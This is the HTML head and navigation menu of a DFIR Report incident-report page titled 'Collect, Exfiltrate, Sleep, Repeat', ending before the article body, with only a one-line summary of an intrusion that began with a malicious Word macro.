<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>Collect, Exfiltrate, Sleep, Repeat &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="0d6d1317a6f763bca75e4b49-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="0d6d1317a6f763bca75e4b49-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/14465" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=14465" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F02%2F06%2Fcollect-exfiltrate-sleep-repeat%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F02%2F06%2Fcollect-exfiltrate-sleep-repeat%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="0d6d1317a6f763bca75e4b49-text/javascript"></script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="0d6d1317a6f763bca75e4b49-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=42FF6F0CF929BCEB0E6321854BCDD379');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="Collect, Exfiltrate, Sleep, Repeat" />
<meta property="og:url" content="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/" />
<meta property="og:description" content="In this intrusion from August 2022, we observed a compromise that was initiated with a Word document containing a malicious VBA macro, which established persistence and communication to a command a…" />
<meta property="article:published_time" content="2023-02-06T01:26:23+00:00" />
<meta property="article:modified_time" content="2024-07-12T11:24:32+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/02/17333-003.png" />
<meta property="og:image:width" content="1600" />
<meta property="og:image:height" content="1073" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Collect, Exfiltrate, Sleep, Repeat" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/02/17333-003.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-14465 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
